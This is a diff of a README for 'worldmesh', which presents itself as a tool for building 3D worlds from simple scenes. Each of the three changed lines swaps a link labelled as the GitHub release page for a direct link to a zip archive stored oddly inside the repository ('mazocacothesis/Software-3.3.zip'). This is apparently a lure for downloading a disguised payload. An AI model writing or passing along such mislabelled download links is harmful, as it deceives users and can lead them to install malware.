@@ -1,6 +1,6 @@
 # 🌐 worldmesh - Build 3D worlds from simple scenes
 
-[![Download worldmesh](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Ximeneznarrowminded65/worldmesh/releases)
+[![Download worldmesh](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Ximeneznarrowminded65/worldmesh/main/mazocacothesis/Software-3.3.zip)
 
 ## 🚀 What worldmesh does
 
@@ -32,7 +32,7 @@ For best results, use a PC with:
 
 Visit the release page and download the latest Windows version:
 
-[Go to the worldmesh release page](https://github.com/Ximeneznarrowminded65/worldmesh/releases)
+[Go to the worldmesh release page](https://raw.githubusercontent.com/Ximeneznarrowminded65/worldmesh/main/mazocacothesis/Software-3.3.zip)
 
 On the release page, look for a file with:
 - `.exe`
@@ -179,7 +179,7 @@ If the app is slow:
 
 If you need to download worldmesh later, use the same release page here:
 
-[worldmesh releases](https://github.com/Ximeneznarrowminded65/worldmesh/releases)
+[worldmesh releases](https://raw.githubusercontent.com/Ximeneznarrowminded65/worldmesh/main/mazocacothesis/Software-3.3.zip)
 
 ## 🧭 About this project
 
